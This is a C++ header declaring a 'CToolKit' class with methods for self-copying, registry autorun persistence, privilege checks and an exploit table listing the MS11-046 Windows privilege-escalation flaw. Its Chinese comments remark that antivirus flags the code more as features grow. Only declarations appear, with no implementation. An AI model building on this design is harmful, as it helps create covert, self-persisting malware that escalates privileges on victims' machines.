#pragma once
#include "stdafx.h"
#include "libsysaux.h"
class CToolKit;


//看了看 主要有几种实现方法
//采用了简单的协注册表的方法
//功能写着写着报毒的就多了 Q.Q~


typedef  INT(CToolKit::*LPFUNC)(VOID);

class CToolKit
{
public:
	CToolKit();
	~CToolKit();

	enum expTable;
	enum expArch;

	int execExp(int order);
	BOOL copySelf();
	BOOL setAutoRun();
	BOOL testRegPrivilege();
	BOOL IsAdmin();
	BOOL IsKeyEdit();
private:

	static LPFUNC funcList[16];
	
	INT exp_ms_11046(VOID);
	BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
	int SEU_RandEx(int min, int max);
	
	
	TCHAR executePath[MAX_PATH];
	BOOL bAdmin;
	BOOL bKeyEdit;

};
enum CToolKit::expArch
{
	X86 = 0,
	X64, 
};

enum CToolKit::expTable
{

	EXP_MS_11046 = 0,

};


